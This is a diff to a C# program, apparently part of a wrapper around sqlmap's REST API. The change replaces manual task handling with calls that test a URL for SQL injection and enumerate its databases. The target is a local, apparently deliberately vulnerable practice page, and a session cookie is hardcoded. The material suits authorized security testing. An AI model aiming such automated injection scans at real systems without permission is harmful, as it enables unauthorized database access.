@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Text.RegularExpressions;
 using Newtonsoft.Json.Linq;
 using SqlMapAPIWrapper.Entity;
 
@@ -9,36 +10,16 @@ namespace SqlMapAPIWrapper
     {
         static void Main(string[] args)
         {
-            using (SqlmapSession session = new SqlmapSession("127.0.0.1", 8775))
-            {
-                using (SqlmapManager manager = new SqlmapManager(session))
-                {
-                    string taskid = manager.NewTask();
-                    Dictionary<string, object> options = manager.GetOptions(taskid);
-                    options["url"] = "http://localhost/sqli_1.php?title=1"; //args[0];
-                    options["flushSession"] = true;
-                    //options["cookie"] = "security_level=0; PHPSESSID=ol8tknn5midgnp2unlaf90pbu5";
-                    //options["getBanner"] = true;
-                    
-                    
-                    foreach (var pair in options)
-                        Console.WriteLine("Key: " + pair.Key + "\t:: Value: " + pair.Value);
-                    
-                    
-                    manager.StartTask(taskid, options);
-                    SqlmapStatus status = manager.GetScanStatus(taskid);
-                    while (status.Status != "terminated")
-                    {
-                        System.Threading.Thread.Sleep(new TimeSpan(0, 0, 10));
-                        status = manager.GetScanStatus(taskid);
-                    }
+            SqlMapApiWrapper wrapper = new SqlMapApiWrapper("127.0.0.1",8775);
+            string targetUrl = "http://localhost/sqli_1.php?title=1";
+            string sessionCookie = "PHPSESSID=ea5urs4228j6jkhp5e5jja97n5; security_level=0";
+            bool injectable = wrapper.IsSqlinjectable(targetUrl, sessionCookie);
+            wrapper.GetDatabases(targetUrl, sessionCookie);
+            /*Console.WriteLine($"Url is injectable: {injectable}");
 
-                    List<SqlmapLogItem> logItems = manager.GetLog(taskid);
-                    foreach (SqlmapLogItem item in logItems)
-                        Console.WriteLine(item.Message);
-                    manager.DeleteTask(taskid);
-                }
-            }
+            if (injectable)
+                Console.WriteLine($"Database used is: {wrapper.GetDatabaseType(targetUrl, sessionCookie)}"); */
+
         }
     }
 }
